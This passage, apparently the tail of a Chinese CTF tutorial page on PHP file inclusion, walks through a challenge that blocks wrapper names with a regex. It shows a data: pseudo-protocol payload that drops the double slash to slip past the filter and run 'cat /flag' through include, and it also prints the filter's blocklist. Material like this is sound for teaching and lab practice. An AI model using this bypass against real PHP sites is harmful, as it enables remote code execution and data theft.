+<p><img alt="" src="https://pic1.imgdb.cn/item/683d81d058cb8da5c82526cb.png"></p>
+<p>打开网页给出了源码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="p">}</span>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="c1">// 假如我增加了过滤，你又该如何应对呢？</span>
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/php:\/\/|file:\/\/|flag|http:\/\/|log|phar:\/\/|data:\/\//i'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>        <span class="k">echo</span> <span class="s1">'No No No !'</span><span class="p">;</span>
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="p">}</span>
+<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="k">else</span><span class="p">{</span>
+<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>        <span class="k">include</span> <span class="nv">$file</span><span class="p">;</span>
+<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a><span class="p">}</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/683d81f258cb8da5c82526e6.png"></p>
+<p>这里的正则只匹配了 <code>data://</code>，没有过滤整个 <code>data</code> 伪协议，所以我们去掉 <code>//</code> 即可绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">?file=data:text/plain,</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /fl\ag'</span><span class="p">);</span><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/683d82ad58cb8da5c8252740.png"></p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../xss/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: XSS攻击"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        XSS攻击
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../ssti/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: SSTI注入"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        SSTI注入
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#_1">文件包含漏洞</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">文件包含概述</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">文件包含分类</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">本地文件包含</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">远程文件包含</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_6">如何判断服务器类型</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_7">读取文件</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_8">大小写混写</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_9">文件包含协议</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#file">file://</a>
+        
+      </li>
+    
+      <li>
+        <a href="#php">php://</a>
+        
+      </li>
+    
+      <li>
+        <a href="#data">data://</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#bypass">bypass</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#pearcmd">pearcmd</a>
+        
+      </li>
+    
+      <li>
+        <a href="#peclcmd">peclcmd</a>
+        
+      </li>
+    
+      <li>
+        <a href="#proc">proc</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_10">实战</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#input">input</a>
+        
+      </li>
+    
+      <li>
+        <a href="#filter">filter</a>
+        
+      </li>
+    
+      <li>
+        <a href="#nginx-rce">Nginx 日志 RCE</a>
+        
+      </li>
+    
+      <li>
+        <a href="#data-rce">data 伪协议 RCE</a>
+        
+      </li>
+    
+      <li>
+        <a href="#data-rce_1">data 伪协议 RCE 绕过双斜杠</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
